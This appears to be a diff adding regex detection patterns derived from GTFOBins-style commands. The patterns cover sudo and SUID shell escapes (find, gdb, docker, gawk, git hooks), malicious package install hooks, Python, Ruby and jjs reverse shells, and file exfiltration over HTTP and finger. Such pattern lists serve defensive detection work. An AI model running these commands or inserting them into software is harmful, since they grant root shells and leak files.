+\./dig -f http\w:[\w\.\/\?\=\&\%]+|\./dig -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./dig -f \$[A-Z_]+
+sudo dig -f http\w:[\w\.\/\?\=\&\%]+|sudo dig -f \$[A-Z_]+|sudo dig -f [ a-z0-9A-Z\.\-\/\'\"_\@]+
+dmesg -rF "http\w:[\w\.\/\?\=\&\%]+"|dmesg -rF "\$[A-Z_]+"|dmesg -rF "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo dmesg -H
+\./dmsetup create base <<EOF
+0 3534848 linear /dev/loop0 94208
+\./dmsetup ls --exec '/bin/sh -p -s'
+sudo dmsetup create base <<EOF
+0 3534848 linear /dev/loop0 94208
+sudo dmsetup ls --exec '/bin/sh -s'
+fpm -n x -s dir -t rpm -a all --before-install http\w:[\w\.\/\?\=\&\%]+/x\.sh http\w:[\w\.\/\?\=\&\%]+|fpm -n x -s dir -t rpm -a all --before-install \$[A-Z_]+/x\.sh \$[A-Z_]+|fpm -n x -s dir -t rpm -a all --before-install [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.sh [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo dnf install -y x-1\.0-1\.noarch\.rpm
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+docker cp http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+|docker cp [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+|docker cp \$[A-Z_]+ \$[A-Z_]+:\$[A-Z_]+
+docker cp http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ [\w\-_\/]+|docker cp [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ [\w\-_\/]+|docker cp \$[A-Z_]+:\$[A-Z_]+ [\w\-_\/]+
+docker cp [\w\-_\/]+ http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+|docker cp [\w\-_\/]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+|docker cp [\w\-_\/]+ \$[A-Z_]+:\$[A-Z_]+
+docker cp [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|docker cp http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|docker cp \$[A-Z_]+:\$[A-Z_]+ \$[A-Z_]+
+\./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+sudo dpkg -l
+echo 'exec /bin/sh' > \$[A-Z_]+/x\.sh|echo 'exec /bin/sh' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.sh|echo 'exec /bin/sh' > http\w:[\w\.\/\?\=\&\%]+/x\.sh
+fpm -n x -s dir -t deb -a all --before-install [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.sh [ a-z0-9A-Z\.\-\/\'\"_\@]+|fpm -n x -s dir -t deb -a all --before-install http\w:[\w\.\/\?\=\&\%]+/x\.sh http\w:[\w\.\/\?\=\&\%]+|fpm -n x -s dir -t deb -a all --before-install \$[A-Z_]+/x\.sh \$[A-Z_]+
+sudo dpkg -i x_1\.0_all\.deb
+echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > http\w:[\w\.\/\?\=\&\%]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > \$[A-Z_]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py
+os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)
+pty\.spawn\("/bin/sh"\)' > \$[A-Z_]+/setup\.py|pty\.spawn\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|pty\.spawn\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as u
+else: import urllib as u\, urllib2 as r
+r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' > \$[A-Z_]+/setup\.py|r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as ss
+else: import SimpleHTTPServer as s\, SocketServer as ss
+ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py|ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > \$[A-Z_]+/setup\.py
+os\.execl\('\$\(whereis python\)'\, '\$\(whereis python\)'\, '-c'\, /"/"/"import sys\;
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r
+else: import urllib as r
+r\.urlretrieve\('[ a-z0-9A-Z\.\-\/\'\"_\@]+'\, '[ a-z0-9A-Z\.\-\/\'\"_\@]+'\)/"/"/"\)" > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|r\.urlretrieve\('\$[A-Z_]+'\, '\$[A-Z_]+'\)/"/"/"\)" > \$[A-Z_]+/setup\.py|r\.urlretrieve\('http\w:[\w\.\/\?\=\&\%]+'\, 'http\w:[\w\.\/\?\=\&\%]+'\)/"/"/"\)" > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+os\.execl\('\$\(whereis python\)'\, 'python'\, '-c'\, 'open\(/"\$[A-Z_]+/"\,/"w\+/"\)\.write\(/"DATA/"\)'\)" > \$[A-Z_]+/setup\.py|os\.execl\('\$\(whereis python\)'\, 'python'\, '-c'\, 'open\(/"[ a-z0-9A-Z\.\-\/\'\"_\@]+/"\,/"w\+/"\)\.write\(/"DATA/"\)'\)" > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|os\.execl\('\$\(whereis python\)'\, 'python'\, '-c'\, 'open\(/"http\w:[\w\.\/\?\=\&\%]+/"\,/"w\+/"\)\.write\(/"DATA/"\)'\)" > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > http\w:[\w\.\/\?\=\&\%]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > \$[A-Z_]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py
+sudo easy_install http\w:[\w\.\/\?\=\&\%]+|sudo easy_install [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo easy_install \$[A-Z_]+
+sudo eb logs
+emacs -Q -nw --eval '\(term "/bin/sh"\)'
+\./emacs -Q -nw --eval '\(term "/bin/sh -p"\)'
+sudo emacs -Q -nw --eval '\(term "/bin/sh"\)'
+\./env /bin/sh -p
+sudo env /bin/sh
+sudo eqn "\$[A-Z_]+"|sudo eqn "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo eqn "http\w:[\w\.\/\?\=\&\%]+"
+sudo expand "\$[A-Z_]+"|sudo expand "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo expand "http\w:[\w\.\/\?\=\&\%]+"
+expect -c 'spawn /bin/sh\;interact'
+\./expect -c 'spawn /bin/sh -p\;interact'
+sudo expect -c 'spawn /bin/sh\;interact'
+echo 'exec\("/bin/sh"\)' > \$[A-Z_]+/x\.rb|echo 'exec\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/x\.rb|echo 'exec\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.rb
+echo 'exec\("/bin/sh"\)' > \$[A-Z_]+/x\.rb|echo 'exec\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/x\.rb|echo 'exec\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.rb
+file -f http\w:[\w\.\/\?\=\&\%]+|file -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|file -f \$[A-Z_]+
+file -m \$[A-Z_]+|file -m http\w:[\w\.\/\?\=\&\%]+|file -m [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./file -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./file -f \$[A-Z_]+|\./file -f http\w:[\w\.\/\?\=\&\%]+
+sudo file -f [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo file -f \$[A-Z_]+|sudo file -f http\w:[\w\.\/\?\=\&\%]+
+find \. -exec /bin/sh /\; -quit
+\./find \. -exec /bin/sh -p /\; -quit
+sudo find \. -exec /bin/sh /\; -quit
+finger "\$\(base64 http\w:[\w\.\/\?\=\&\%]+\)@http\w:[\w\.\/\?\=\&\%]+"|finger "\$\(base64 [ a-z0-9A-Z\.\-\/\'\"_\@]+\)@[ a-z0-9A-Z\.\-\/\'\"_\@]+"|finger "\$\(base64 \$[A-Z_]+\)@\$[A-Z_]+"
+finger x@[ a-z0-9A-Z\.\-\/\'\"_\@]+ \| base64 -d > "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|finger x@\$[A-Z_]+ \| base64 -d > "\$[A-Z_]+"|finger x@http\w:[\w\.\/\?\=\&\%]+ \| base64 -d > "http\w:[\w\.\/\?\=\&\%]+"
+flock -u / /bin/sh
+\./flock -u / /bin/sh -p
+sudo flock -u / /bin/sh
+fmt -pNON_EXISTING_PREFIX "\$[A-Z_]+"|fmt -pNON_EXISTING_PREFIX "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|fmt -pNON_EXISTING_PREFIX "http\w:[\w\.\/\?\=\&\%]+"
+fmt -999 "http\w:[\w\.\/\?\=\&\%]+"|fmt -999 "\$[A-Z_]+"|fmt -999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./fmt -999 "http\w:[\w\.\/\?\=\&\%]+"|\./fmt -999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./fmt -999 "\$[A-Z_]+"
+sudo fmt -999 "\$[A-Z_]+"|sudo fmt -999 "http\w:[\w\.\/\?\=\&\%]+"|sudo fmt -999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+fold -w99999999 "\$[A-Z_]+"|fold -w99999999 "http\w:[\w\.\/\?\=\&\%]+"|fold -w99999999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./fold -w99999999 "\$[A-Z_]+"|\./fold -w99999999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./fold -w99999999 "http\w:[\w\.\/\?\=\&\%]+"
+sudo fold -w99999999 "\$[A-Z_]+"|sudo fold -w99999999 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo fold -w99999999 "http\w:[\w\.\/\?\=\&\%]+"
+gawk 'BEGIN {system\("/bin/sh"\)}'
+gawk -v [\w\-_]+=\$[A-Z_]+ -v [\w\-_]+=\$[A-Z_]+ 'BEGIN {|gawk -v [\w\-_]+=http\w:[\w\.\/\?\=\&\%]+ -v [\w\-_]+=http\w:[\w\.\/\?\=\&\%]+ 'BEGIN {|gawk -v [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+ -v [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+ 'BEGIN {
+while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}'
+while \(c && \(c \|& getline\) > 0\) print \$0 \|& s\; close\(c\)}}'
+gawk '//' "\$[A-Z_]+"|gawk '//' "http\w:[\w\.\/\?\=\&\%]+"|gawk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./gawk '//' "http\w:[\w\.\/\?\=\&\%]+"|\./gawk '//' "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./gawk '//' "\$[A-Z_]+"
+sudo gawk 'BEGIN {system\("/bin/sh"\)}'
+\./gawk 'BEGIN {system\("/bin/sh"\)}'
+gcc -wrapper /bin/sh\,-s \.
+gcc -x c -E "\$[A-Z_]+"|gcc -x c -E "http\w:[\w\.\/\?\=\&\%]+"|gcc -x c -E "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo gcc -wrapper /bin/sh\,-s \.
+gdb -nx -ex '!sh' -ex quit
+os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)
+pty\.spawn\("/bin/sh"\)' -ex quit
+gdb -nx -ex 'python import sys\; from os import environ as e
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as u
+else: import urllib as u\, urllib2 as r
+r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' -ex quit
+gdb -nx -ex 'python import sys\; from os import environ as e
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as ss
+else: import SimpleHTTPServer as s\, SocketServer as ss
+ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' -ex quit
+gdb -nx -ex 'python import sys\; from os import environ as e
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r
+else: import urllib as r
+r\.urlretrieve\(e"URL"\, e"LFILE"\)' -ex quit
+gdb -nx -ex "dump value \$[A-Z_]+ /"DATA/"" -ex quit|gdb -nx -ex "dump value [ a-z0-9A-Z\.\-\/\'\"_\@]+ /"DATA/"" -ex quit|gdb -nx -ex "dump value http\w:[\w\.\/\?\=\&\%]+ /"DATA/"" -ex quit
+gdb -nx -ex 'python print\(open\("[\w\-_\/]+"\)\.read\(\)\)' -ex quit
+gdb -nx -ex 'python from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)' -ex quit
+\./gdb -nx -ex 'python import os\; os\.execl\("/bin/sh"\, "sh"\, "-p"\)' -ex quit
+sudo gdb -nx -ex '!sh' -ex quit
+sudo setcap cap_setuid\+ep gdb
+\./gdb -nx -ex 'python import os\; os\.setuid\(0\)' -ex '!sh' -ex quit
+gem open -e "/bin/sh -c /bin/sh" rdoc
+gem open rdoc
+echo 'system\("/bin/sh"\)' > \$[A-Z_]+/x|echo 'system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/x|echo 'system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x
+gem build [ a-z0-9A-Z\.\-\/\'\"_\@]+/x|gem build http\w:[\w\.\/\?\=\&\%]+/x|gem build \$[A-Z_]+/x
+echo 'system\("/bin/sh"\)' > \$[A-Z_]+/x|echo 'system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/x|echo 'system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/x
+gem install --file http\w:[\w\.\/\?\=\&\%]+/x|gem install --file [ a-z0-9A-Z\.\-\/\'\"_\@]+/x|gem install --file \$[A-Z_]+/x
+sudo gem open -e "/bin/sh -c /bin/sh" rdoc
+genisoimage -q -o - "\$[A-Z_]+"|genisoimage -q -o - "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|genisoimage -q -o - "http\w:[\w\.\/\?\=\&\%]+"
+sudo genisoimage -q -o - "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo genisoimage -q -o - "http\w:[\w\.\/\?\=\&\%]+"|sudo genisoimage -q -o - "\$[A-Z_]+"
+ghc -e 'System\.Process\.callCommand "/bin/sh"'
+sudo ghc -e 'System\.Process\.callCommand "/bin/sh"'
+gimp -idf [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.socket\(\)
+os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as u
+else: import urllib as u\, urllib2 as r
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as ss
+else: import SimpleHTTPServer as s\, SocketServer as ss
+ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)'
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r
+else: import urllib as r
+git help config
+git branch --help config
+git init "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|git init "\$[A-Z_]+"|git init "http\w:[\w\.\/\?\=\&\%]+"
+echo 'exec /bin/sh 0<&2 1>&2' >"[ a-z0-9A-Z\.\-\/\'\"_\@]+/\.git/hooks/pre-commit\.sample"|echo 'exec /bin/sh 0<&2 1>&2' >"http\w:[\w\.\/\?\=\&\%]+/\.git/hooks/pre-commit\.sample"|echo 'exec /bin/sh 0<&2 1>&2' >"\$[A-Z_]+/\.git/hooks/pre-commit\.sample"
+git -C "\$[A-Z_]+" commit --allow-empty -m x|git -C "http\w:[\w\.\/\?\=\&\%]+" commit --allow-empty -m x|git -C "[ a-z0-9A-Z\.\-\/\'\"_\@]+" commit --allow-empty -m x
+ln -s /bin/sh "http\w:[\w\.\/\?\=\&\%]+/git-x"|ln -s /bin/sh "[ a-z0-9A-Z\.\-\/\'\"_\@]+/git-x"|ln -s /bin/sh "\$[A-Z_]+/git-x"
+git diff /dev/null http\w:[\w\.\/\?\=\&\%]+|git diff /dev/null \$[A-Z_]+|git diff /dev/null [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo git -p help config
+sudo git branch --help config
+git init "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|git init "\$[A-Z_]+"|git init "http\w:[\w\.\/\?\=\&\%]+"
+echo 'exec /bin/sh 0<&2 1>&2' >"[ a-z0-9A-Z\.\-\/\'\"_\@]+/\.git/hooks/pre-commit\.sample"|echo 'exec /bin/sh 0<&2 1>&2' >"http\w:[\w\.\/\?\=\&\%]+/\.git/hooks/pre-commit\.sample"|echo 'exec /bin/sh 0<&2 1>&2' >"\$[A-Z_]+/\.git/hooks/pre-commit\.sample"
+sudo git -C "http\w:[\w\.\/\?\=\&\%]+" commit --allow-empty -m x|sudo git -C "\$[A-Z_]+" commit --allow-empty -m x|sudo git -C "[ a-z0-9A-Z\.\-\/\'\"_\@]+" commit --allow-empty -m x
+ln -s /bin/sh "http\w:[\w\.\/\?\=\&\%]+/git-x"|ln -s /bin/sh "[ a-z0-9A-Z\.\-\/\'\"_\@]+/git-x"|ln -s /bin/sh "\$[A-Z_]+/git-x"
+grep '' http\w:[\w\.\/\?\=\&\%]+|grep '' \$[A-Z_]+|grep '' [ a-z0-9A-Z\.\-\/\'\"_\@]+
+\./grep '' http\w:[\w\.\/\?\=\&\%]+|\./grep '' [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./grep '' \$[A-Z_]+
+sudo grep '' [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo grep '' \$[A-Z_]+|sudo grep '' http\w:[\w\.\/\?\=\&\%]+
+echo '#!/bin/sh' > http\w:[\w\.\/\?\=\&\%]+|echo '#!/bin/sh' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo '#!/bin/sh' > \$[A-Z_]+
+echo 'exec /bin/sh -p 0<&1' >> [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'exec /bin/sh -p 0<&1' >> \$[A-Z_]+|echo 'exec /bin/sh -p 0<&1' >> http\w:[\w\.\/\?\=\&\%]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+gtester -q [ a-z0-9A-Z\.\-\/\'\"_\@]+|gtester -q \$[A-Z_]+|gtester -q http\w:[\w\.\/\?\=\&\%]+
+echo '#!/bin/sh -p' > \$[A-Z_]+|echo '#!/bin/sh -p' > http\w:[\w\.\/\?\=\&\%]+|echo '#!/bin/sh -p' > [ a-z0-9A-Z\.\-\/\'\"_\@]+
+echo 'exec /bin/sh -p 0<&1' >> [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo 'exec /bin/sh -p 0<&1' >> \$[A-Z_]+|echo 'exec /bin/sh -p 0<&1' >> http\w:[\w\.\/\?\=\&\%]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo gtester -q http\w:[\w\.\/\?\=\&\%]+|sudo gtester -q \$[A-Z_]+|sudo gtester -q [ a-z0-9A-Z\.\-\/\'\"_\@]+
+echo '#!/bin/sh' > http\w:[\w\.\/\?\=\&\%]+|echo '#!/bin/sh' > [ a-z0-9A-Z\.\-\/\'\"_\@]+|echo '#!/bin/sh' > \$[A-Z_]+
+echo 'exec /bin/sh 0<&1' >> http\w:[\w\.\/\?\=\&\%]+|echo 'exec /bin/sh 0<&1' >> \$[A-Z_]+|echo 'exec /bin/sh 0<&1' >> [ a-z0-9A-Z\.\-\/\'\"_\@]+
+chmod \+x \$[A-Z_]+|chmod \+x http\w:[\w\.\/\?\=\&\%]+|chmod \+x [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo gtester -q http\w:[\w\.\/\?\=\&\%]+|sudo gtester -q \$[A-Z_]+|sudo gtester -q [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo hd "\$[A-Z_]+"|sudo hd "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo hd "http\w:[\w\.\/\?\=\&\%]+"
+head -c1G "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|head -c1G "\$[A-Z_]+"|head -c1G "http\w:[\w\.\/\?\=\&\%]+"
+\./head -c1G "http\w:[\w\.\/\?\=\&\%]+"|\./head -c1G "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./head -c1G "\$[A-Z_]+"
+sudo head -c1G "http\w:[\w\.\/\?\=\&\%]+"|sudo head -c1G "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo head -c1G "\$[A-Z_]+"
+hexdump -C "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|hexdump -C "http\w:[\w\.\/\?\=\&\%]+"|hexdump -C "\$[A-Z_]+"
+\./hexdump -C "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./hexdump -C "\$[A-Z_]+"|\./hexdump -C "http\w:[\w\.\/\?\=\&\%]+"
+sudo hexdump -C "http\w:[\w\.\/\?\=\&\%]+"|sudo hexdump -C "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo hexdump -C "\$[A-Z_]+"
+highlight --no-doc --failsafe "\$[A-Z_]+"|highlight --no-doc --failsafe "http\w:[\w\.\/\?\=\&\%]+"|highlight --no-doc --failsafe "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+\./highlight --no-doc --failsafe "http\w:[\w\.\/\?\=\&\%]+"|\./highlight --no-doc --failsafe "\$[A-Z_]+"|\./highlight --no-doc --failsafe "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo highlight --no-doc --failsafe "http\w:[\w\.\/\?\=\&\%]+"|sudo highlight --no-doc --failsafe "\$[A-Z_]+"|sudo highlight --no-doc --failsafe "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+iconv -f 8859_1 -t 8859_1 "http\w:[\w\.\/\?\=\&\%]+"|iconv -f 8859_1 -t 8859_1 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|iconv -f 8859_1 -t 8859_1 "\$[A-Z_]+"
+\./iconv -f 8859_1 -t 8859_1 "\$[A-Z_]+"|\./iconv -f 8859_1 -t 8859_1 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./iconv -f 8859_1 -t 8859_1 "http\w:[\w\.\/\?\=\&\%]+"
+\./iconv -f 8859_1 -t 8859_1 "\$[A-Z_]+"|\./iconv -f 8859_1 -t 8859_1 "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./iconv -f 8859_1 -t 8859_1 "http\w:[\w\.\/\?\=\&\%]+"
+\./install -m 6777 [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|\./install -m 6777 http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|\./install -m 6777 \$[A-Z_]+ \$[A-Z_]+
+sudo install -m 6777 http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|sudo install -m 6777 [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo install -m 6777 \$[A-Z_]+ \$[A-Z_]+
+\./ionice /bin/sh -p
+sudo ionice /bin/sh
+ip -force -batch "\$[A-Z_]+"|ip -force -batch "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|ip -force -batch "http\w:[\w\.\/\?\=\&\%]+"
+\./ip -force -batch "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./ip -force -batch "\$[A-Z_]+"|\./ip -force -batch "http\w:[\w\.\/\?\=\&\%]+"
+\./ip netns add foo
+\./ip netns exec foo /bin/sh -p
+\./ip netns delete foo
+sudo ip -force -batch "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo ip -force -batch "\$[A-Z_]+"|sudo ip -force -batch "http\w:[\w\.\/\?\=\&\%]+"
+sudo ip netns add foo
+sudo ip netns exec foo /bin/sh
+sudo ip netns delete foo
+require 'socket'\; exit if fork\;[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.new\(ENV"RHOST"\,ENV"RPORT"\)\;while\([\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.gets\)\;IO\.popen\(cmd\,"r"\){\|io\|c\.print io\.read} end
+require 'webrick'\; WEBrick::HTTPServer\.new\(:Port => 8888\, :DocumentRoot => Dir\.pwd\)\.start\;
+File\.open\("[\w\-_\/]+"\, "w\+"\) { \|f\| f\.write\("DATA"\) }
+require "fiddle"\; Fiddle\.dlopen\("lib\.so"\)
+echo "Java\.type\('java\.lang\.Runtime'\)\.getRuntime\(\)\.exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)\.waitFor\(\)" \| jjs
+var [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.getOutputStream\(\)\;while\(!s\.isClosed\(\)\){ while\(pi\.available\(\)>0\)so\.write\(pi\.read\(\)\)\; while\(pe\.available\(\)>0\)so\.write\(pe\.read\(\)\)\; while\(si\.available\(\)>0\)po\.write\(si\.read\(\)\)\; so\.flush\(\)\;po\.flush\(\)\; Java\.type\("java\.lang\.Thread"\)\.sleep\(50\)\; try {p\.exitValue\(\)\;break\;}catch \(e\){}}\;p\.destroy\(\)\;s\.close\(\)\;' \| jjs
+fos\.getChannel\(\)\.transferFrom\(rbc\, 0\, Number\.MAX_VALUE\)\;
+rbc\.close\(\)\;" \| jjs
+fw\.close\(\)\;' \| jjs
+while \(\(line =[ a-z0-9A-Z\.\-\/\'\"_\@]+\.readLine\(\)\) !=[ a-z0-9A-Z\.\-\/\'\"_\@]+\) { print\(line\)\; }' \| jjs
+echo "Java\.type\('java\.lang\.Runtime'\)\.getRuntime\(\)\.exec\('/bin/sh -pc /\$@\|sh/\${IFS}-p _ echo sh -p <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)\.waitFor\(\)" \| \./jjs
+echo "Java\.type\('java\.lang\.Runtime'\)\.getRuntime\(\)\.exec\('/bin/sh -c /\$@\|sh _ echo sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)\.waitFor\(\)" \| sudo jjs
+join -a 2 /dev/null [ a-z0-9A-Z\.\-\/\'\"_\@]+|join -a 2 /dev/null http\w:[\w\.\/\?\=\&\%]+|join -a 2 /dev/null \$[A-Z_]+
